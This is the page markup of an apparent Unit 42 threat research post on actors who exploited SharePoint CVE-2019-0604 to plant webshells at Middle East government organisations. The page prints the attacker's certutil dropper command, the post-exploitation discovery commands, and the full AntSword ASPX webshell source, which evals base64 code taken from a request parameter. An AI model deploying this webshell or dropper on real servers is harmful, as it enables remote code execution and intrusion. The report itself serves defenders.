setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-103658 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Actors Still Exploiting SharePoint Vulnerability to Attack Middle East Government Organizations</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-103658 entry-meta">
			
			
			<span class="post-views-count">25,177</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'103658','like')"><i class="ui ui-2"></i><span class="ml-5">14</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 13</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Factors-still-exploiting-sharepoint-vulnerability%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Factors-still-exploiting-sharepoint-vulnerability%2F+-+Actors+Still+Exploiting+SharePoint+Vulnerability+to+Attack+Middle+East+Government+Organizations" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Factors-still-exploiting-sharepoint-vulnerability%2F&title=Actors+Still+Exploiting+SharePoint+Vulnerability+to+Attack+Middle+East+Government+Organizations&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/robertfalcone/" title="Posts by Robert Falcone" class="author url fn" rel="author">Robert Falcone</a>        </p>
        <p><time datetime="2020-02-03T14:00:42+00:00">February 3, 2020 at 6:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit-42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/china-chopper/" rel="tag">China Chopper</a>, <a href="https://unit42.paloaltonetworks.com/tag/cve-2019-0604/" rel="tag">CVE-2019-0604</a>, <a href="https://unit42.paloaltonetworks.com/tag/emissary-panda/" rel="tag">Emissary Panda</a>, <a href="https://unit42.paloaltonetworks.com/tag/middle-east/" rel="tag">Middle East</a>, <a href="https://unit42.paloaltonetworks.com/tag/sharepoint/" rel="tag">SharePoint</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="900" height="450" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/01/Vulnerability-r3d2-900x450-1.png" class="attachment-single size-single" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/01/Vulnerability-r3d2-900x450-1.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/01/Vulnerability-r3d2-900x450-1-300x150.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/01/Vulnerability-r3d2-900x450-1-768x384.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/01/Vulnerability-r3d2-900x450-1-370x185.png 370w" sizes="(max-width: 900px) 100vw, 900px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/actors-still-exploiting-sharepoint-vulnerability/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><h2>Executive Summary</h2>
<p>On September 10, 2019, we observed unknown threat actors exploiting a vulnerability in SharePoint described in <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0604">CVE-2019-0604</a> to install several webshells on the website of a Middle East government organization. One of these webshells is the open source <a href="https://github.com/AntSwordProject/antSword">AntSword webshell freely available on Github</a>, which is remarkably similar to the infamous China Chopper webshell.</p>
<p>On January 10, 2020, we used Shodan to search for Internet accessible servers running versions of SharePoint vulnerable to CVE-2019-0604. While admittedly the version numbers provided by SharePoint within HTTP responses do not always provide the precise SharePoint version number, we decided to use it to check if it was less than the version numbers of the patched SharePoint versions from the <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0604">Microsoft advisory</a>. We performed this comparison and found 28,881 servers that advertised a vulnerable version of SharePoint. We did not actively check each server to verify if they were indeed vulnerable, so it is possible that many of these public-facing SharePoint servers were not vulnerable or since patched. Regardless, the sheer number of servers and publicly available exploit code suggests that CVE-2019-0604 is still a major attack vector.</p>
<p>Using this collection of webshells, the actors moved laterally to other systems on the network by dumping credentials with a variant of the notorious Mimikatz tool and using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py">Impacket’s atexec tool</a> to use dumped credentials to run commands on other systems. On September 19, 2019, we observed the same exact Mimikatz variant uploaded to a webshell hosted at another government organization in a second country in the Middle East. The Mimikatz variant uploaded to these two organizations is unique, as it involves a seemingly custom loader application written in .NET. Therefore, we believe that the same threat group is behind both intrusions.</p>
<p>Back in April 2019, we first observed the <a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/">Emissary Panda threat group exploiting CVE-2019-0604 to install webshells on SharePoint servers</a> at government organizations in two Middle Eastern countries. Fast forward five months to the current attacks and we see exploitation of the same vulnerability at government organizations in two different countries compared to the April attacks. We do not have any strong ties to connect the current attacks exploiting this vulnerability in SharePoint with the Emissary Panda attacks carried out in April. The overlaps between these two sets of attacks include exploitation of a common vulnerability, similar toolset and a shared government victimology, but no strong pivot points to connect these attack campaigns together.</p>
<p>The exploitation of this vulnerability is not unique to Emissary Panda, as multiple threat groups are using this vulnerability to exploit SharePoint servers to gain initial access to targeted networks. We would like to acknowledge the possibility of an overlap in the AntSword webshell, as we stated that Emissary Panda used China Chopper in the April attacks and AntSword and China Chopper webshells are incredibly similar. However, at this time we do not believe the April attacks used AntSword based on artifacts analyzed on the SharePoint server, specifically none of the IIS logs in the April attacks used the AntSword User-Agent in requests to the webshell that were observed in the current attacks.</p>
<p>Palo Alto Networks customers are protected from the threat described in this blog through Threat Prevention signatures for the exploits and C2 traffic as well as through WildFire. More details on this protection is available in the conclusion of the report.</p>
<h4>Exploiting CVE-2019-0604</h4>
<p>On September 10, 2019, we observed an HTTP POST request to the following URL that we believe was the exploitation of CVE-2019-0604 in a publicly facing SharePoint server (<a href="https://attack.mitre.org/techniques/T1190/">T1190</a>):</p>
<p><span style="font-family: 'courier new', courier, monospace;">/_layouts/15/picker.aspx</span></p>
<p>We did not have access to the data sent within the HTTP POST request above, however, we observed the following command executed on the SharePoint server at the time of the inbound request:</p>
<p><span style="font-family: 'courier new', courier, monospace;">C:\Windows\System32\cmd.exe /c echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBEZWJ1Zz0idHJ1ZSIgVHJhY2U9ImZhbHNlIiAlPg[..snip..] &gt; c:\programdata\cmd.txt &amp; certutil -decode c:\programdata\cmd.txt C:\Program Files\Common Files\microsoft shared\Web Server Extensions\14\TEMPLATE\LAYOUTS\c.aspx &amp; certutil -decode c:\programdata\cmd.txt C:\Program Files\Common Files\microsoft shared\Web Server Extensions\15\TEMPLATE\LAYOUTS\c.aspx &amp; certutil -decode c:\programdata\cmd.txt C:\Program Files\Common Files\microsoft shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\c.aspx</span></p>
<p>The command above uses the <span style="font-family: 'courier new', courier, monospace;">echo</span> command to write a large chunk of base64 encoded data to a text file named <span style="font-family: 'courier new', courier, monospace;">cmd.txt</span>. The command then uses the <span style="font-family: 'courier new', courier, monospace;">certutil</span> application to convert the base64 encoded data (<a href="https://attack.mitre.org/techniques/T1132/">T1132</a>) in the <span style="font-family: 'courier new', courier, monospace;">cmd.txt</span> file to <span style="font-family: 'courier new', courier, monospace;">c.aspx</span> in three different SharePoint related folders. The result of this entire command saves a variant of the <a href="https://github.com/SecWiki/WebShell-2/blob/master/Aspx/awen%20asp.net%20webshell.aspx">Awen asp.net webshell</a> (<a href="https://attack.mitre.org/techniques/T1100/">T1100</a>) to the SharePoint server to further interact with the compromise server. The Awen webshell deployed in the exploitation of this SharePoint vulnerability had a SHA256 hash of <span style="font-family: 'courier new', courier, monospace;">5d4628d4dd89f31236f8c56686925cbb1a9b4832f81c95a4300e64948afede21</span>.</p>
<h4>Actor’s Awen Webshell</h4>
<p>Just 40 seconds after the suspected exploitation of CVE-2019-0604, we observed the first HTTP GET request to a webshell at <span style="font-family: 'courier new', courier, monospace;">c.aspx</span>, which is a modified version of the <a href="https://github.com/SecWiki/WebShell-2/blob/master/Aspx/awen%20asp.net%20webshell.aspx">freely available awen asp.net webshell</a>. We believe this HTTP GET request was the actor visiting the webshell after exploitation and prior to executing commands. Figure 1 shows the Awen webshell, which has little functionality outside of setting the path to the command prompt application and running commands.</p>
<figure id="attachment_103709" aria-describedby="caption-attachment-103709" style="width: 1024px" class="wp-caption aligncenter"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-1-Awen-webshell-installed-by-actor-after-exploiting-CVE-2019-0604.png" rel="wpdevart_lightbox"><img class="wp-image-103709 size-large" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-1-Awen-webshell-installed-by-actor-after-exploiting-CVE-2019-0604-1024x465.png" alt="Figure 1 Awen webshell installed by actor after exploiting CVE-2019-0604" width="1024" height="465" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-1-Awen-webshell-installed-by-actor-after-exploiting-CVE-2019-0604-1024x465.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-1-Awen-webshell-installed-by-actor-after-exploiting-CVE-2019-0604-300x136.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-1-Awen-webshell-installed-by-actor-after-exploiting-CVE-2019-0604-768x348.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-1-Awen-webshell-installed-by-actor-after-exploiting-CVE-2019-0604-1536x697.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-1-Awen-webshell-installed-by-actor-after-exploiting-CVE-2019-0604-900x408.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-1-Awen-webshell-installed-by-actor-after-exploiting-CVE-2019-0604-370x168.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2020/02/Figure-1-Awen-webshell-installed-by-actor-after-exploiting-CVE-2019-0604.png 1750w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><figcaption id="caption-attachment-103709" class="wp-caption-text">Figure 1 Awen webshell installed by actor after exploiting CVE-2019-0604</figcaption></figure>
<p>The actor uses the Awen webshell seen in Figure 1 to run various commands to do an initial discovery on the system and network, including user accounts (<a href="https://attack.mitre.org/techniques/T1033/">T1033</a> and <a href="https://attack.mitre.org/techniques/T1087/">T1087</a>), files and folders (<a href="https://attack.mitre.org/techniques/T1087/">T1083</a>), privileged groups (<a href="https://attack.mitre.org/techniques/T1069/">T1069</a>), remote systems (<a href="https://attack.mitre.org/techniques/T1018/">T1018</a>) and network configuration (<a href="https://attack.mitre.org/techniques/T1016/">T1016</a>). Table 1 not only shows the commands used for discovery, but also the commands used to deploy another webshell to the server using the <span style="font-family: 'courier new', courier, monospace;">echo</span> command to write base64 encoded data to <span style="font-family: 'courier new', courier, monospace;">a.txt</span> and using the <span style="font-family: 'courier new', courier, monospace;">certutil</span> application to decode and save to <span style="font-family: 'courier new', courier, monospace;">bitreeview.aspx</span>. Table 1 also shows the time delta between the commands executed using the Awen webshell to provide insight into the tempo at which this actor executed commands.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 174.667px;"><strong>Time delta from previous command</strong></td>
<td style="width: 549.333px;"><strong>Command</strong></td>
</tr>
<tr>
<td style="width: 174.667px;">3 minutes 55 seconds (from initial exploitation)</td>
<td style="width: 549.333px;">dir c:\programdata\</td>
</tr>
<tr>
<td style="width: 174.667px;">14 seconds</td>
<td style="width: 549.333px;">query user</td>
</tr>
<tr>
<td style="width: 174.667px;">15 seconds</td>
<td style="width: 549.333px;">net group /do</td>
</tr>
<tr>
<td style="width: 174.667px;">32 seconds</td>
<td style="width: 549.333px;">whoami</td>
</tr>
<tr>
<td style="width: 174.667px;">18 seconds</td>
<td style="width: 549.333px;">net user &lt;redacted hostname&gt; /do</td>
</tr>
<tr>
<td style="width: 174.667px;">12 seconds</td>
<td style="width: 549.333px;">net localgroup administrators</td>
</tr>
<tr>
<td style="width: 174.667px;">21 seconds</td>
<td style="width: 549.333px;">ping -n 1 8.8.8.8</td>
</tr>
<tr>
<td style="width: 174.667px;">20 seconds</td>
<td style="width: 549.333px;">net group exchange servers /do</td>
</tr>
<tr>
<td style="width: 174.667px;">22 seconds</td>
<td style="width: 549.333px;">ipconfig /all</td>
</tr>
<tr>
<td style="width: 174.667px;">23 seconds</td>
<td style="width: 549.333px;">ping -n 1 -a 10.x.x.x</td>
</tr>
<tr>
<td style="width: 174.667px;">10 minutes 53 seconds</td>
<td style="width: 549.333px;">echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkpzY3JpcHQi[..snip..] &gt; c:\programdata\a.txt</td>
</tr>
<tr>
<td style="width: 174.667px;">5 seconds</td>
<td style="width: 549.333px;">type c:\programdata\a.txt</td>
</tr>
<tr>
<td style="width: 174.667px;">5 seconds</td>
<td style="width: 549.333px;">certutil -decode c:\programdata\a.txt c:\program files\common files\microsoft shared\web server extensions\14\template\layouts\bitreeview.aspx</td>
</tr>
<tr>
<td style="width: 174.667px;">23 seconds</td>
<td style="width: 549.333px;">del c:\programdata\a.txt</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 1 Awen webshell installed by actor after exploiting CVE-2019-0604</em></span></p>
<p>The webshell named <span style="font-family: 'courier new', courier, monospace;">bitreeview.aspx</span> was saved to a folder within the SharePoint server’s install path. The <span style="font-family: 'courier new', courier, monospace;">bitreeview.aspx</span> file is a variant of the AntSword webshell that has undeniably similar traits as the infamous China Chopper webshell. After installing this AntSword webshell, the actor no longer uses the Awen webshell and issues the first command to AntSword 35 seconds after the last command issued to the Awen webshell.</p>
<h4>Actor’s AntSword Webshell</h4>
<p>AntSword is a modular webshell that involves a very simple webshell that the actor would deploy to the compromised server and a client application referred to as the AntSword Shell Manager. The use of the client application differs from many other webshells that the actor would interact with in a browser window. The actor would use the AntSword Shell Manager to interact with the AntSword webshell on the compromised server, as the Shell Manager sends the appropriate script to the webshell that will execute to carry out the desired action. To provide a sense of the limited functionality within the webshell itself, the <span style="font-family: 'courier new', courier, monospace;">bitreeview.aspx</span> AntSword webshell deployed in this attack (<span style="font-family: 'courier new', courier, monospace;"><span style="font-family: georgia, palatino, serif;">SHA256:</span> 15ecb6ac6c637b58b2114e6b21b5b18b0c9f5341ee74b428b70e17e64b7da55e</span>) was only 162 bytes and contained the following:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69289c989e2705008024" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-mixed-highlight" title="Contains Mixed Languages"></span><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
%@ Page Language="Jscript"%

% 
eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.
FromBase64String(Request.Item["Darr1R1ng"])),"unsafe"); %</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69289c989e2705008024-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69289c989e2705008024-2">2</div><div class="crayon-num" data-line="crayon-5f69289c989e2705008024-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69289c989e2705008024-4">4</div><div class="crayon-num" data-line="crayon-5f69289c989e2705008024-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69289c989e2705008024-6">6</div><div class="crayon-num" data-line="crayon-5f69289c989e2705008024-7">7</div></div>
				</td>
